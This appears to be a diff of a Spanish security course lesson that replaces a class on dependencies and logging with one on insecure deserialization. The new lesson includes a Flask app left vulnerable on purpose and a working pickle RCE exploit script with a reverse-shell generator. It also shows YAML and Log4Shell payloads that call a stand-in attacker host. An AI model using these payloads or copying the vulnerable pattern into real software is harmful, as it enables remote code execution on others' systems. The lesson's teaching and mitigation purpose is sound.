@@ -1,4 +1,4 @@
-# Clase 25: Componentes con Vulnerabilidades Conocidas + Logging/Monitoreo
+# Clase 25: Deserializacion Insegura
 
 **Duracion:** 2 horas
 
@@ -6,1002 +6,957 @@
 
 ## Objetivos de Aprendizaje
 
-1. Comprender la importancia de gestionar dependencias y componentes
-2. Usar herramientas SCA (Snyk, Dependabot, OWASP Dependency-Check)
-3. Conocer SBOM (Software Bill of Materials) y su utilidad
-4. Implementar logging seguro sin exponer datos sensibles
-5. Disenar un sistema de monitoreo y deteccion basico
+1. Comprender que es serializacion y deserializacion
+2. Identificar los riesgos de seguridad en diferentes formatos de serializacion
+3. Crear y entender payloads maliciosos en pickle (Python)
+4. Implementar deserializacion segura con validacion de esquema
+5. Conocer las mitigaciones contra ataques de deserializacion
 
 ---
 
 ## Contenido Detallado
 
-### 1. Componentes con Vulnerabilidades Conocidas
+### 1. Que es Serializacion/Deserializacion?
 
-OWASP Top 10 categoria #6: usar componentes con vulnerabilidades conocidas.
+**Serializacion:** Proceso de convertir un objeto en memoria a un formato que pueda ser almacenado o transmitido (bytes, string, XML, JSON).
 
-**Estadisticas:**
-- 90%+ de las aplicaciones usan componentes open source
-- En promedio, un proyecto tiene 50+ dependencias directas y 200+ transitivas
-- Cada dependencia transitiva es un vector de ataque potencial
+**Deserializacion:** Proceso inverso: reconstruir el objeto a partir del formato almacenado/transmitido.
 
-**Ejemplos de vulnerabilidades famosas:**
+```
+Objeto en memoria ──Serializar──>  Bytes / String / JSON / XML
+Bytes / String / JSON / XML  ──Deserializar──>  Objeto en memoria
+```
 
-| Vulnerabilidad | Componente | Impacto | Year |
-|---------------|-----------|---------|------|
-| Log4Shell (CVE-2021-44228) | Log4j 2.x | RCE remoto sin autenticacion | 2021 |
-| Struts2 S2-045 | Apache Struts 2 | RCE via Content-Type | 2017 |
-| Heartbleed (CVE-2014-0160) | OpenSSL 1.0.1 | Filtracion de memoria | 2014 |
-| Spring4Shell (CVE-2022-22965) | Spring Framework | RCE via data binding | 2022 |
-| ImageTragick (CVE-2016-3714) | ImageMagick | RCE via imagenes maliciosas | 2016 |
+### 2. Formatos de Serializacion
 
-### 2. Software Composition Analysis (SCA)
+| Formato | Lenguaje | Seguro? | Notas |
+|---------|----------|---------|-------|
+| **pickle** | Python | NO | Ejecuta codigo arbitrario al deserializar |
+| **Java serialization** | Java | NO | Puede ejecutar codigo via gadget chains |
+| **PHP unserialize** | PHP | NO | Permite RCE via gadget chains |
+| **YAML** | Multiples | NO | Puede ejecutar codigo con tags peligrosos |
+| **JSON** | Universal | SI | Solo datos, no ejecuta codigo |
+| **XML** | Universal | Parcial | Seguro si se deshabilitan DTD/entidades |
+| **MessagePack** | Multiples | Generalmente seguro | No ejecuta codigo directamente |
+| **Protocol Buffers** | Multiples | Seguro | Formato binario estricto |
+| **CBOR** | Multiples | Generalmente seguro | Similar a JSON |
 
-El SCA es el proceso de identificar y gestionar riesgos en componentes de software de terceros.
+### 3. Ataques por Formato
 
-**Herramientas SCA:**
+#### pickle (Python)
 
-| Herramienta | Tipo | Caracteristicas |
-|-------------|------|-----------------|
-| **Snyk** | SaaS + CLI | Base de datos mas completa, integracion CI/CD, correcciones automaticas |
-| **Dependabot** | GitHub integrado | PRs automaticos para actualizar dependencias |
-| **OWASP Dependency-Check** | Open source | Analisis local, base de datos NVD, plugins Maven/Gradle |
-| **GitHub Dependabot Alerts** | GitHub | Alertas automaticas de vulnerabilidades en dependencias |
-| **WhiteSource (Mend)** | SaaS | Gestion completa de licencias y vulnerabilidades |
-| **Sonatype Nexus Lifecycle** | SaaS + On-prem | Politicas de seguridad automatizadas |
+pickle permite ejecutar codigo arbitrario durante la deserializacion porque esta disenado para reconstruir objetos Python, incluyendo clases y funciones arbitrarias.
 
-### 3. SBOM (Software Bill of Materials)
+```python
+import pickle
+import os
 
-SBOM es un inventario formal y estructurado de todos los componentes que conforman un software.
+# Payload malicioso que ejecuta whoami
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ('whoami',))
 
-**Formato SPDX (ISO/IEC 5962):**
+payload = pickle.dumps(Exploit())
 
-```json
-{
-  "spdxVersion": "SPDX-2.3",
-  "dataLicense": "CC0-1.0",
-  "name": "MiApp-SBOM",
-  "creationInfo": {
-    "created": "2024-06-25T10:00:00Z",
-    "creators": ["Tool: MiApp-SBOM-Generator"]
-  },
-  "packages": [
-    {
-      "name": "Flask",
-      "versionInfo": "2.3.0",
-      "supplier": "Organization: Pallets Project",
-      "downloadLocation": "https://pypi.org/project/Flask/2.3.0/",
-      "licenseDeclared": "BSD-3-Clause",
-      "copyrightText": "Copyright 2010 Pallets"
-    },
-    {
-      "name": "requests",
-      "versionInfo": "2.31.0",
-      "supplier": "Organization: Python Software Foundation",
-      "licenseDeclared": "Apache-2.0"
-    }
+# Al deserializar, se ejecuta whoami
+pickle.loads(payload)  # Ejecuta: whoami
+```
+
+#### Java Serialization
+
+Java serialization puede ser explotada mediante "gadget chains": combinaciones de clases disponibles en el classpath que, al ser deserializadas, ejecutan codigo arbitrario.
+
+```java
+// Ejemplo conceptual (simplificado)
+// CommonsCollections1 es una gadget chain clasica
+ObjectInputStream ois = new ObjectInputStream(new FileInputStream("payload.ser"));
+Object obj = ois.readObject();  // Ejecuta codigo si el payload usa gadgets
+```
+
+**Gadgets famosos:**
+- CommonsCollections (Apache Commons Collections)
+- Spring beans
+- JDK built-in (URLDNS, Runtime)
+- FastJSON, Jackson (polymorphic type handling)
+
+#### YAML
+
+YAML permite definir tipos personalizados con `!!`, que pueden ejecutar codigo.
+
+```yaml
+# Payload YAML peligroso
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [
+    [!!java.net.URL ["http://atacante.com/evil.jar"]]
   ]
-}
+]
 ```
 
-### 4. Logging Seguro
+### 4. Log4Shell (CVE-2021-44228)
 
-#### Que NO debe loguearse
+Aunque no es estrictamente deserializacion, Log4Shell es un ataque relacionado donde Log4j procesa JNDI lookups desde mensajes de log, permitiendo RCE.
 
-- Contrasenas (nunca, jamas)
-- Tokens de autenticacion (JWT, API keys, session tokens)
-- Datos de tarjetas de credito (PAN, CVV)
-- Datos biometricos
-- Informacion medica (a menos que sea estrictamente necesario y cifrado)
-- Secretos de infraestructura (claves SSH, certificados privados)
-- Datos personales no necesarios (GDPR)
-
-#### Que SI debe loguearse
-
-- Intentos de autenticacion (exitosos y fallidos) - sin contrasenas
-- Cambios de permisos/roles
-- Accesos denegados (403, 401)
-- Errores del servidor con detalles tecnicos (sin datos sensibles)
-- Operaciones de administrador
-- Creacion/eliminacion de recursos
-- Cambios en configuracion de seguridad
-- Tiempos de respuesta anormales (posible ataque)
-
-#### Logs Estructurados
-
-```json
-{
-  "timestamp": "2024-06-25T10:30:00.123Z",
-  "level": "WARN",
-  "logger": "app.api.auth",
-  "message": "Intento de login fallido",
-  "context": {
-    "user_id": "user_123",
-    "ip": "192.168.1.100",
-    "user_agent": "Mozilla/5.0...",
-    "reason": "contrasena_incorrecta"
-  },
-  "request_id": "req_abc123",
-  "session_id": "sess_xyz789"
-}
+```
+Payload: ${jndi:ldap://atacante.com/a}
 ```
 
-### 5. SIEM y Deteccion de Intrusos
+Log4j deserializa datos de un servidor LDAP controlado por el atacante, ejecutando codigo arbitrario.
 
-| Sistema | Descripcion |
-|---------|-------------|
-| **SIEM** (Security Information and Event Management) | Centraliza y correlaciona logs de multiples fuentes para detectar patrones de ataque |
-| **IDS** (Intrusion Detection System) | Detecta actividad sospechosa en la red o sistema |
-| **IPS** (Intrusion Prevention System) | Detecta y BLOQUEA actividad sospechosa en tiempo real |
-| **WAF** (Web Application Firewall) | Protege aplicaciones web de ataques como SQLi, XSS |
+### 5. Mitigaciones
 
-**Ejemplos:**
-- SIEM: Splunk, ELK Stack (Elasticsearch, Logstash, Kibana), Wazuh
-- IDS/IPS: Snort, Suricata
-- WAF: ModSecurity, Cloudflare WAF, AWS WAF
+| Mitigacion | Descripcion |
+|------------|-------------|
+| **No usar formatos peligrosos** | Preferir JSON sobre pickle, Java serialization, YAML |
+| **Validacion de esquema** | Validar datos contra un esquema fijo antes de deserializar |
+| **Firmas digitales** | Firmar datos serializados para verificar integridad y origen |
+| **Librerias seguras** | Usar `json` en vez de `pickle`, `yaml.safe_load()` en vez de `yaml.load()` |
+| **Lista blanca de clases** | Permitir solo clases conocidas y seguras durante la deserializacion |
+| **Sandboxing** | Deserializar en entornos aislados (contenedores, sandbox) |
+| **No aceptar datos serializados de fuentes no confiables** | Es la mitigacion mas simple y efectiva |
 
 ---
 
-## Ejercicio 1: Analizar Dependencias con Snyk
+## Ejercicio 1: Crear y Explotar Payload Malicioso en Pickle
 
 ### Escenario
 
-Analizar un archivo `requirements.txt` con Snyk CLI para identificar vulnerabilidades y proponer correcciones.
+Una aplicacion Python usa pickle para serializar la sesion del usuario. Crear un payload que ejecute un comando del sistema.
 
-**Paso 1: Crear requirements.txt vulnerable**
-
-```txt
-# requirements.txt - Proyecto con dependencias vulnerables
-flask==1.0           # Version vulnerable: < 2.3.2
-requests==2.20.0     # Version vulnerable: < 2.31.0
-django==2.2          # Version vulnerable: < 3.2.23
-urllib3==1.24.1      # Version vulnerable: < 1.26.18
-pyyaml==5.1          # Version vulnerable: < 6.0
-log4j==2.14.0        # Version vulnerable: < 2.17.0 (simulado)
-```
-
-**Paso 2: Analizar con Snyk**
-
-```bash
-# Instalar Snyk CLI
-npm install -g snyk
-
-# Autenticar (requiere cuenta gratuita en snyk.io)
-snyk auth
-
-# Probar Snyk (sin conexion)
-snyk test --file=requirements.txt --package-manager=pip
-
-# Generar reporte JSON
-snyk test --json > snyk-report.json
-```
-
-**Paso 3: Script Python para analisis offline (simulado)**
+**Aplicacion vulnerable:**
 
 ```python
 """
-sca_analyzer.py - Simulacion de analisis SCA
+app_pickle_vulnerable.py - App que usa pickle para sesiones (vulnerable)
 """
-import json
-import re
-from packaging.version import Version, InvalidVersion
-from typing import Dict, List, Tuple
+from flask import Flask, request, jsonify, session
+import pickle
+import base64
 
-# Base de datos de vulnerabilidades simulada
-VULNERABILITY_DB = {
-    'flask': {
-        'min_fixed': '2.3.2',
-        'vulnerabilities': [
-            {'id': 'CVE-2023-30861', 'severity': 'HIGH',
-             'description': 'Possible XSS vulnerability in Flask',
-             'affected': '<2.3.2'},
-        ]
-    },
-    'requests': {
-        'min_fixed': '2.31.0',
-        'vulnerabilities': [
-            {'id': 'CVE-2023-32681', 'severity': 'MEDIUM',
-             'description': 'Potential bypass of SSL verification',
-             'affected': '<2.31.0'},
-        ]
-    },
-    'django': {
-        'min_fixed': '3.2.23',
-        'vulnerabilities': [
-            {'id': 'CVE-2024-27351', 'severity': 'HIGH',
-             'description': 'Potential denial-of-service via regex',
-             'affected': '<3.2.23'},
-        ]
-    },
-    'urllib3': {
-        'min_fixed': '1.26.18',
-        'vulnerabilities': [
-            {'id': 'CVE-2023-45803', 'severity': 'MEDIUM',
-             'description': 'Request body not always validated',
-             'affected': '<1.26.18'},
-        ]
-    },
-    'pyyaml': {
-        'min_fixed': '6.0',
-        'vulnerabilities': [
-            {'id': 'CVE-2020-14343', 'severity': 'CRITICAL',
-             'description': 'Arbitrary code execution via yaml.load()',
-             'affected': '<6.0'},
-        ]
-    },
-}
+app = Flask(__name__)
 
+# SIMULACION PELIGROSA: Usar pickle para serializar datos de sesion
+# Esto es intencionalmente inseguro para fines educativos
 
-def parse_requirements(filepath: str) -> List[Dict]:
-    """Parse a requirements.txt file"""
-    dependencies = []
-    with open(filepath, 'r') as f:
-        for line in f:
-            line = line.strip()
-            if line and not line.startswith('#') and not line.startswith('-'):
-                # Parsear: flask==1.0
-                match = re.match(r'([a-zA-Z0-9_-]+)\s*==\s*([\d.]+)', line)
-                if match:
-                    dependencies.append({
-                        'name': match.group(1),
-                        'version': match.group(2),
-                    })
-    return dependencies
+def deserialize_session(session_data_b64):
+    """Deserializa datos de sesion desde base64"""
+    try:
+        session_data = base64.b64decode(session_data_b64)
+        return pickle.loads(session_data)  # VULNERABLE: pickle.loads en datos no confiables
+    except Exception as e:
+        return {'error': str(e)}
 
+@app.route('/api/datos')
+def get_datos():
+    # Simular recepcion de cookie serializada
+    session_cookie = request.cookies.get('session_data', '')
 
-def analyze_dependencies(dependencies: List[Dict]) -> List[Dict]:
-    """Analyze dependencies for known vulnerabilities"""
-    results = []
-    for dep in dependencies:
-        name = dep['name']
-        version = dep['version']
-        vuln_info = VULNERABILITY_DB.get(name)
+    if not session_cookie:
+        return jsonify({'error': 'No session data'}), 401
 
-        if not vuln_info:
-            results.append({
-                'name': name,
-                'version': version,
-                'status': 'NO_KNOWN_VULNERABILITIES',
-                'vulnerabilities': [],
-                'fixed_version': None,
-            })
-            continue
+    user_data = deserialize_session(session_cookie)
+    return jsonify(user_data)
 
-        try:
-            current = Version(version)
-            fixed = Version(vuln_info['min_fixed'])
-
-            if current < fixed:
-                results.append({
-                    'name': name,
-                    'version': version,
-                    'status': 'VULNERABLE',
-                    'vulnerabilities': vuln_info['vulnerabilities'],
-                    'fixed_version': vuln_info['min_fixed'],
-                    'recommendation': f"Actualizar {name} de {version} a {vuln_info['min_fixed']}",
-                })
-            else:
-                results.append({
-                    'name': name,
-                    'version': version,
-                    'status': 'OK',
-                    'vulnerabilities': [],
-                    'fixed_version': None,
-                })
-
-        except InvalidVersion:
-            results.append({
-                'name': name,
-                'version': version,
-                'status': 'INVALID_VERSION',
-                'vulnerabilities': [],
-                'fixed_version': None,
-            })
-
-    return results
-
-
-def generate_report(results: List[Dict]):
-    """Generate a security report"""
-    total = len(results)
-    vulnerable = [r for r in results if r['status'] == 'VULNERABLE']
-    ok = [r for r in results if r['status'] in ('OK', 'NO_KNOWN_VULNERABILITIES')]
-
-    print("=" * 70)
-    print("REPORTE DE ANALISIS SCA")
-    print("=" * 70)
-    print(f"\nTotal dependencias analizadas: {total}")
-    print(f"Dependencias seguras: {len(ok)}")
-    print(f"Dependencias VULNERABLES: {len(vulnerable)}")
-    print()
-
-    if vulnerable:
-        print("VULNERABILIDADES ENCONTRADAS:")
-        print("-" * 70)
-        for v in vulnerable:
-            print(f"\n[!] {v['name']} {v['version']} (arreglado en: {v['fixed_version']})")
-            for vuln in v['vulnerabilities']:
-                print(f"    CVE: {vuln['id']}")
-                print(f"    Severidad: {vuln['severity']}")
-                print(f"    Descripcion: {vuln['description']}")
-            print(f"    Recomendacion: {v['recommendation']}")
-
-    print("\n" + "=" * 70)
-    print("DEPENDENCIAS SEGURAS:")
-    print("-" * 70)
-    for o in ok:
-        print(f"  [+] {o['name']} {o['version']}")
-
-    # Generar JSON
-    report = {
-        'summary': {
-            'total': total,
-            'vulnerable': len(vulnerable),
-            'safe': len(ok),
-        },
-        'vulnerabilities': vulnerable,
+@app.route('/api/login')
+def login():
+    # Simular login que crea sesion serializada con pickle
+    user_data = {
+        'username': 'usuario_ejemplo',
+        'role': 'user',
+        'id': 123
     }
-    print(f"\nReporte JSON generado: snyk_simulated_report.json")
-    with open('snyk_simulated_report.json', 'w') as f:
-        json.dump(report, f, indent=2)
+    serialized = base64.b64encode(pickle.dumps(user_data)).decode('utf-8')
+
+    response = jsonify({'mensaje': 'Login exitoso', 'session': serialized})
+    response.set_cookie('session_data', serialized, httponly=True)
+    return response
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000)
+```
+
+**Script de explotacion:**
+
+```python
+"""
+exploit_pickle.py - Genera payload malicioso para pickle
+"""
+import pickle
+import base64
+import os
+import subprocess
+
+# ============================================================
+# CLASE EXPLOIT
+# ============================================================
+
+class RCE:
+    """Clase que ejecuta un comando al ser deserializada"""
+    def __reduce__(self):
+        """
+        __reduce__ es un metodo especial que pickle usa para
+        determinar como reconstruir un objeto.
+        Retorna: (callable, args)
+        - callable: la funcion a ejecutar
+        - args: tupla de argumentos para la funcion
+        """
+        return (os.system, ('whoami',))
+
+    def __str__(self):
+        return "Payload malicioso de pickle"
 
 
-def generate_fixed_requirements(results: List[Dict], original_file: str, output_file: str):
-    """Generate a fixed requirements.txt"""
-    fixes = {r['name']: r['fixed_version'] for r in results if r['fixed_version']}
+# ============================================================
+# GENERAR PAYLOAD
+# ============================================================
 
-    with open(original_file, 'r') as f_in, open(output_file, 'w') as f_out:
-        for line in f_in:
-            stripped = line.strip()
-            match = re.match(r'([a-zA-Z0-9_-]+)\s*==\s*([\d.]+)', stripped)
-            if match and match.group(1) in fixes:
-                fixed_line = line.replace(
-                    f"=={match.group(2)}",
-                    f">={fixes[match.group(1)]}"
+def generate_pickle_payload(command='whoami'):
+    """Genera un payload pickle que ejecuta un comando"""
+    class DynamicRCE:
+        def __reduce__(self):
+            return (os.system, (command,))
+
+    payload_bytes = pickle.dumps(DynamicRCE())
+    payload_b64 = base64.b64encode(payload_bytes).decode('utf-8')
+    return payload_b64
+
+
+def generate_reverse_shell_payload(ip, port):
+    """Genera payload para reverse shell (simulado/educativo)"""
+    command = f'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"'
+    return generate_pickle_payload(command)
+
+
+# ============================================================
+# EXPLOTACION
+# ============================================================
+
+def exploit_vulnerable_app():
+    """Demostracion de explotacion contra app vulnerable"""
+    import requests
+
+    base_url = "http://127.0.0.1:5000"
+
+    # 1. Primero, login normal para ver el formato
+    print("[*] Obteniendo sesion normal...")
+    r = requests.get(f"{base_url}/api/login")
+    normal_session = r.cookies.get('session_data', '')
+    if normal_session:
+        print(f"[+] Sesion normal obtenida: {normal_session[:50]}...")
+
+    # 2. Generar payload malicioso
+    print("\n[*] Generando payload malicioso...")
+    payload = generate_pickle_payload('whoami')
+    print(f"[+] Payload: {payload}")
+
+    # 3. Enviar payload como cookie
+    print("\n[*] Enviando payload malicioso al servidor...")
+    r = requests.get(
+        f"{base_url}/api/datos",
+        cookies={'session_data': payload}
+    )
+    print(f"[+] Respuesta del servidor: {r.text}")
+
+    # 4. Payload para comando personalizado
+    print("\n[*] Probando payload para listar directorio...")
+    ls_payload = generate_pickle_payload('dir' if os.name == 'nt' else 'ls -la')
+    r = requests.get(
+        f"{base_url}/api/datos",
+        cookies={'session_data': ls_payload}
+    )
+    print(f"[+] Respuesta del servidor: {r.text}")
+
+
+# ============================================================
+# DEMOSTRACION LOCAL
+# ============================================================
+
+def demo_pickle_local():
+    """Demostracion local de como pickle ejecuta codigo"""
+    print("=" * 60)
+    print("DEMOSTRACION: pickle ejecuta codigo al deserializar")
+    print("=" * 60)
+
+    # Crear payload malicioso
+    payload_bytes = pickle.dumps(RCE())
+    print(f"\n[+] Payload serializado: {payload_bytes.hex()[:60]}...")
+
+    print("\n[!] Deserializando payload... (se ejecutara 'whoami')")
+    print("[!] ESTO ES PELIGROSO - No hacer en produccion")
+    print("-" * 40)
+
+    try:
+        # AL DESERIALIZAR, SE EJECUTA EL COMANDO
+        obj = pickle.loads(payload_bytes)
+        print(f"\n[+] Objeto deserializado: {obj}")
+    except Exception as e:
+        print(f"\n[-] Error: {e}")
+
+
+def demo_safe_deserialization():
+    """Demostracion de como deserializar pickle de forma segura"""
+    print("\n" + "=" * 60)
+    print("DESERIALIZACION SEGURA (limitada)")
+    print("=" * 60)
+
+    # Restringir que clases pueden ser deserializadas
+    import builtins
+
+    class SafeUnpickler(pickle.Unpickler):
+        """Unpickler que solo permite clases seguras"""
+
+        ALLOWED_CLASSES = {
+            'builtins.dict': dict,
+            'builtins.list': list,
+            'builtins.str': str,
+            'builtins.int': int,
+            'builtins.float': float,
+            'builtins.bool': bool,
+            'builtins.tuple': tuple,
+            'builtins.set': set,
+            'builtins.NoneType': type(None),
+        }
+
+        def find_class(self, module, name):
+            """Sobreescribe find_class para restringir clases permitidas"""
+            full_name = f"{module}.{name}"
+            if full_name not in self.ALLOWED_CLASSES:
+                raise pickle.UnpicklingError(
+                    f"Clase no permitida: {full_name}"
                 )
-                f_out.write(fixed_line)
-            else:
-                f_out.write(line)
+            return self.ALLOWED_CLASSES[full_name]
 
-    print(f"\nArchivo corregido generado: {output_file}")
+    # Intentar deserializar payload malicioso
+    payload = pickle.dumps(RCE())
+
+    try:
+        # Esto fallara porque RCE no esta en la lista blanca
+        safe_unpickler = SafeUnpickler(io.BytesIO(payload))
+        obj = safe_unpickler.load()
+        print(f"[-] Deserializacion exitosa (inesperado): {obj}")
+    except pickle.UnpicklingError as e:
+        print(f"[+] Clase maliciosa bloqueada: {e}")
+    except Exception as e:
+        print(f"[+] Payload malicioso detectado: {e}")
 
 
 if __name__ == '__main__':
-    import sys
+    import io
 
-    req_file = sys.argv[1] if len(sys.argv) > 1 else 'requirements.txt'
+    print("\n=== EJERCICIO: Pickle RCE ===\n")
 
-    print(f"Analizando: {req_file}\n")
+    # Demo local
+    demo_pickle_local()
+    print()
 
-    dependencies = parse_requirements(req_file)
-    results = analyze_dependencies(dependencies)
-    generate_report(results)
+    # Demostracion de lista blanca
+    demo_safe_deserialization()
 
-    # Generar version corregida
-    generate_fixed_requirements(results, req_file, 'requirements_fixed.txt')
-```
-
-**Ejecutar el analisis:**
-
-```bash
-# Crear requirements.txt
-# Guardar el contenido vulnerable en requirements.txt
-
-# Ejecutar el analizador
-python sca_analyzer.py requirements.txt
-
-# Ver el reporte generado
-type snyk_simulated_report.json
-
-# Ver el archivo con dependencias corregidas
-type requirements_fixed.txt
+    print("\n=== EXPLOTACION CONTRA SERVIDOR ===")
+    print("Para explotar el servidor, ejecutar:")
+    print("1. Iniciar servidor: python app_pickle_vulnerable.py")
+    print("2. Ejecutar exploit: python -c 'from exploit_pickle import *; exploit_vulnerable_app()'")
 ```
 
 ---
 
-## Ejercicio 2: Logger Seguro en Python
+## Ejercicio 2: Deserializacion Segura en Python con JSON y Validacion de Esquema
 
 ### Escenario
 
-Escribir un sistema de logging que registre eventos de seguridad sin exponer datos sensibles.
+Reemplazar pickle con JSON y agregar validacion de esquema usando una libreria como `jsonschema` o validacion manual.
 
 ```python
 """
-secure_logger.py - Sistema de logging seguro
+safe_deserialization.py - Deserializacion segura con JSON y esquema
 """
-import logging
+from flask import Flask, request, jsonify
 import json
-import re
+import hmac
 import hashlib
-from datetime import datetime, timezone
-from typing import Dict, Optional, Any
-from flask import Flask, request, g
-import uuid
+import os
+from typing import Any, Dict, Optional
 
 app = Flask(__name__)
 
 # ============================================================
-# CONFIGURACION DE LOGGING SEGURO
+# CONFIGURACION
 # ============================================================
 
-class SensitiveDataFilter(logging.Filter):
+# Clave secreta para firmar tokens (NUNCA hardcodear en produccion)
+SECRET_KEY = os.urandom(32).hex()
+app.config['SECRET_KEY'] = SECRET_KEY
+
+# Esquema de datos de sesion permitido
+SESSION_SCHEMA = {
+    'username': str,
+    'user_id': int,
+    'role': str,
+    'email': str,
+    'created_at': str,
+}
+
+ROLES_PERMITIDOS = {'admin', 'user', 'viewer'}
+
+
+# ============================================================
+# VALIDACION DE ESQUEMA
+# ============================================================
+
+def validate_session_data(data: Dict[str, Any]) -> bool:
     """
-    Filtro que remueve datos sensibles de los mensajes de log.
-    Patrones de datos sensibles que deben ser redactados.
+    Valida que los datos cumplan con el esquema esperado.
+    Retorna True si son validos, False en caso contrario.
     """
+    if not isinstance(data, dict):
+        return False
 
-    SENSITIVE_PATTERNS = {
-        'password': r'(?i)(password|passwd|pwd|secret|token|api_key|apikey|authorization)\s*[:=]\s*["\']?([^"\'\s&,]+)',
-        'credit_card': r'\b(?:\d[ -]*?){13,16}\b',
-        'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
-        'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
-        'ip_private': r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b',
-    }
+    # Verificar que todos los campos requeridos esten presentes
+    for field, field_type in SESSION_SCHEMA.items():
+        if field not in data:
+            print(f"Campo faltante: {field}")
+            return False
+        if not isinstance(data[field], field_type):
+            print(f"Tipo incorrecto para {field}: esperado {field_type}, obtenido {type(data[field])}")
+            return False
 
-    def filter(self, record: logging.LogRecord) -> bool:
-        """Filtra el mensaje y redacta datos sensibles"""
-        if hasattr(record, 'msg') and isinstance(record.msg, str):
-            original = record.msg
-            for data_type, pattern in self.SENSITIVE_PATTERNS.items():
-                record.msg = re.sub(pattern, f'[REDACTED_{data_type}]', record.msg)
-            if original != record.msg:
-                record.msg += ' [SENSITIVE_DATA_REDACTED]'
-        return True
+    # Validar valores especificos
+    if data['role'] not in ROLES_PERMITIDOS:
+        print(f"Rol no permitido: {data['role']}")
+        return False
 
+    if data['user_id'] <= 0:
+        print(f"User ID invalido: {data['user_id']}")
+        return False
 
-class JSONFormatter(logging.Formatter):
-    """Formato JSON estructurado para logs"""
+    if not isinstance(data['username'], str) or len(data['username']) < 1:
+        print("Username invalido")
+        return False
 
-    def format(self, record: logging.LogRecord) -> str:
-        log_entry = {
-            'timestamp': datetime.now(timezone.utc).isoformat(),
-            'level': record.levelname,
-            'logger': record.name,
-            'module': record.module,
-            'function': record.funcName,
-            'line': record.lineno,
-            'message': record.getMessage(),
-        }
-
-        # Agregar excepcion si existe
-        if record.exc_info and record.exc_info[0]:
-            log_entry['exception'] = {
-                'type': record.exc_info[0].__name__,
-                'message': str(record.exc_info[1]),
-                # NO incluir traceback completo en produccion (puede tener datos sensibles)
-                'traceback': self.formatException(record.exc_info) if record.levelno <= logging.DEBUG else None,
-            }
-
-        # Agregar atributos extra (contexto)
-        if hasattr(record, 'extra_data'):
-            log_entry['extra'] = record.extra_data
-
-        return json.dumps(log_entry, default=str, ensure_ascii=False)
+    return True
 
 
-class SecureLogger:
+def validate_extra_data(data: Dict[str, Any]) -> bool:
     """
-    Logger seguro que registra eventos sin exponer datos sensibles.
-    Proporciona metodos especificos para eventos de seguridad.
+    Verifica que no haya campos adicionales no esperados.
+    Esto previene que el atacante inyecte datos arbitrarios.
     """
+    allowed_fields = set(SESSION_SCHEMA.keys())
+    actual_fields = set(data.keys())
 
-    def __init__(self, name: str = 'secure_logger'):
-        self.logger = logging.getLogger(name)
-        self.logger.setLevel(logging.INFO)
+    extra_fields = actual_fields - allowed_fields
+    if extra_fields:
+        print(f"Campos no permitidos: {extra_fields}")
+        return False
 
-        # Evitar duplicacion de handlers
-        if not self.logger.handlers:
-            handler = logging.StreamHandler()
-            handler.setFormatter(JSONFormatter())
-            handler.addFilter(SensitiveDataFilter())
-            self.logger.addHandler(handler)
-
-    def _sanitize_context(self, context: Dict[str, Any]) -> Dict[str, Any]:
-        """Sanitiza el contexto eliminando/reemplazando datos sensibles"""
-        if not context:
-            return {}
-
-        SENSITIVE_KEYS = {'password', 'pass', 'pwd', 'token', 'secret',
-                          'api_key', 'api_secret', 'auth', 'authorization',
-                          'credit_card', 'card_number', 'cvv', 'ssn', 'pin'}
-
-        sanitized = {}
-        for key, value in context.items():
-            key_lower = key.lower()
-            if any(sk in key_lower for sk in SENSITIVE_KEYS):
-                sanitized[key] = '[REDACTED]'
-            elif isinstance(value, str) and len(value) > 200:
-                sanitized[key] = value[:200] + '... [TRUNCATED]'
-            else:
-                sanitized[key] = value
-
-        return sanitized
-
-    def auth_event(self, event_type: str, user_id: str, success: bool,
-                   ip: str = '', context: Optional[Dict] = None):
-        """Registra eventos de autenticacion"""
-        extra = {
-            'event_type': 'auth',
-            'auth_event': event_type,
-            'user_id': user_id,
-            'success': success,
-            'ip': ip,
-            'user_agent': context.get('user_agent', '') if context else '',
-        }
-        # NO registrar contrasenas ni tokens
-        if context:
-            extra['context'] = self._sanitize_context(context)
-
-        level = logging.INFO if success else logging.WARNING
-        self.logger.log(level, f"Auth event: {event_type} - user={user_id} success={success}", extra={'extra_data': extra})
-
-    def access_denied(self, user_id: str, resource: str, action: str,
-                      ip: str = '', reason: str = ''):
-        """Registra accesos denegados"""
-        extra = {
-            'event_type': 'access_control',
-            'user_id': user_id,
-            'resource': resource,
-            'action': action,
-            'ip': ip,
-            'reason': reason,
-            'status': 'denied',
-        }
-        self.logger.warning(f"Access denied: user={user_id} resource={resource} action={action}",
-                           extra={'extra_data': extra})
-
-    def data_change(self, user_id: str, resource_type: str, resource_id: str,
-                    action: str, changes: Dict[str, Any]):
-        """Registra cambios en datos"""
-        # NO registrar los valores nuevos de datos sensibles
-        safe_changes = self._sanitize_context(changes)
-
-        extra = {
-            'event_type': 'data_change',
-            'user_id': user_id,
-            'resource_type': resource_type,
-            'resource_id': resource_id,
-            'action': action,
-            'changes': safe_changes,
-        }
-        self.logger.info(f"Data change: {action} on {resource_type}:{resource_id} by {user_id}",
-                        extra={'extra_data': extra})
-
-    def security_alert(self, alert_type: str, severity: str, message: str,
-                       context: Optional[Dict] = None):
-        """Registra alertas de seguridad"""
-        extra = {
-            'event_type': 'security_alert',
-            'alert_type': alert_type,
-            'severity': severity,
-            'context': self._sanitize_context(context) if context else {},
-        }
-        level = getattr(logging, severity.upper(), logging.WARNING)
-        self.logger.log(level, f"Security alert [{alert_type}]: {message}",
-                        extra={'extra_data': extra})
-
-    def error_event(self, error_type: str, message: str, user_id: str = '',
-                    exception: Optional[Exception] = None):
-        """Registra errores sin exponer datos sensibles"""
-        extra = {
-            'event_type': 'error',
-            'error_type': error_type,
-            'user_id': user_id,
-        }
-        self.logger.error(f"Error: {error_type} - {message}",
-                         exc_info=exception,
-                         extra={'extra_data': extra})
+    return True
 
 
 # ============================================================
-# INSTANCIA GLOBAL
+# FIRMAS DIGITALES
 # ============================================================
 
-secure_logger = SecureLogger()
